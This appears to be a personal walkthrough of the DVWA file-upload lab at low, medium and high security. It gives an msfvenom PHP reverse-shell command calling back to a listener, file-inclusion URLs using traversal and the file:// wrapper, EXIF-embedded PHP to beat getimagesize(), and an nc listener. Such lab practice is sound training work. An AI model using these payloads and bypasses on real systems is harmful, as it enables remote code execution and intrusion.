## Low

- For low I tried meterpeter shell for php, both staged and unstaged, it didn't work but then I tried simple reverse_shell and it worked.
- `msfvenom -p php/reverse_php LHOST=192.168.0.111 LPORT=4444 -f raw > shell_2.php`
- I was able to upload the shell_2.php without any issue, and got it executed by a file inclusion vulnerability at 
	- `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell_2.php`


## Medium

- Since this time a .jpeg or .png extension was required, i renamed the same shell to `shell_2.php.jpeg`. And uploaded this bad boy.
- And since for medium level security file inclusion vulnerability has some security measures in place but it is still vulnerable to `file://` wrapper. I used that.
	- `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg`


## High

- Here the upload functionality checks whether the upload is truly an image by using `getimagesize()` functionality. So we'll need to embed our shell code into an actual image file. Things got a bit tricky here. But eventually it can be explained in this way..
	- You'll need to embed shell code in image's exif data. It's easy to embed a small phpcode to verify if it will work before hand. Let's say image is white.png. So...
		- `exiftool white.png -Comment="<?php phpinfo(); ?>"` will do the job. 
		- Then if we upload this image and execute the using file inclusion vulnerability.
		- `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/white.png` if this shows us phpinfo we can proceed ahead with embedding shell code.
	- Now to embed shell code via just command line was a bit tricky for me atleast so i automated it. Here I generate the same payload as before and then embed it at byte level. 
	- Also had to do some evasion techniques by php-commenting out problematic part.
	- `./image_shell.py -p php/reverse_php -lh 192.168.0.111 -lp 4444 -f raw -i white.png` and upload this image open a listener at 4444 `nc -lvnp 4444` and execute is using same file inclusion vulnerability `http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/white.png` and Voila! 